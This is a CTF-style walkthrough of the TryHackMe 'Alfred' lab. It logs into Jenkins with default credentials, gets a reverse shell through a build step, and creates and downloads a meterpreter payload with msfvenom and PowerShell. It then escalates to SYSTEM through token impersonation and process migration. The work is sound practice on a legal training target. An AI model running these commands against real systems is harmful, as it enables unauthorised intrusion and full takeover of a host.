This is a walkthrough for the room: [Alfred][alfred] on [TryHackMe][thm]. Let’s get started!

# Initial Access
First question is asking about how many TCP ports are open, however it does note that the server will not respond to ping, so we need to run the `-Pn` option for our `nmap` scan.

![a1](/img/thm/alfred/a1.png)

We see that this is clearly a Microsoft server, and there is a website on port 80 and 8080. Let’s take a look!

![a2](/img/thm/alfred/a2.png)

Wow, poor Batman! We know we are looking for login information since the next question asks for it. So there has to be some sort of login page. Let’s try checking 8080.

![a3](/img/thm/alfred/a3.webp)

Bingo! Now we still need a login. Let’s try some default credentials. After looking up Jenkins default credentials: `admin:password` trying that doesn’t work. Let’s try `admin:admin`. That works!

**NOTE:** I got lucky here by guessing default creds, but you could brute force this with hydra if it was more difficult.

Next, the room tells us to find a feature of the system that allows us to run commands. From there we can get a reverse shell on our machine using the command they give us.

If we navigate into the already created project, we can explore some more. Eventually, we get to **Configure**. In here under **Build**, we can run commands on the local system.

Before we do this, we need to download the script the room gives us ([here][nishang]) to our local machine. And then setup our python server:

`python3 -m http.server 80`

Then open a new terminal tab and start a netcat listener:

`nc -nvlp 1234`

Now, let’s enter our commands we want the server to execute. (These are given to us)

Click **Apply**, **Save** then select **Build Now**. If you go to your netcat listener terminal, you should now have a shell!

Now that we are in, we can look for the user flag!

![a6](/img/thm/alfred/a6.png)

Alright! Next section.

# Switching Shells
First step is to create our payload. Let’s open a new terminal and put in the commands given:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<thm_vpn_ip> LPORT=1235 -f exe -o win_shell.exe
```
With the output, we get our next answer:

![a7](/img/thm/alfred/a7-1.webp)

Now we need to download the payload to the machine. Utilize the command given and run it in our shell on the victim machine.

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<thm_vpn_ip>:80/shell-name.exe','shell-name.exe')"`
**NOTE:** If you stopped your Python webserver earlier, you will need to start that again under the folder where you save the payload: python3 -m http.server 80

Now, once again we need to start a listener, but since this is a `meterpreter` shell, we will need to use metasploit. Open a new terminal:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 1235
run
```

Now that our listener is running, let’s start the payload by entering `Start-Process "shell-name.exe"` in the current shell on the victim machine.

You should now have a shell in metasploit!

# Privilege Escalation
Let’s follow along with the instructions. Type `shell` and then `whoami /priv`

Exit the local shell: `exit`, and run the following:

```bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```
Just like the room says, we need to migrate to a process that is running as `NT AUTHORITY\SYSTEM`. Lets run `ps` and look for the `services.exe` process.

![a8](/img/thm/alfred/a8.png)

From here we can run the following command: `migrate 668`

There let’s get the root flag!

# Review
This was a good in-between room. It was sort of a walkthrough but also didn’t give you all the information similar to a CTF. It was an easy room, but I definitely enjoyed it! See ya next time!
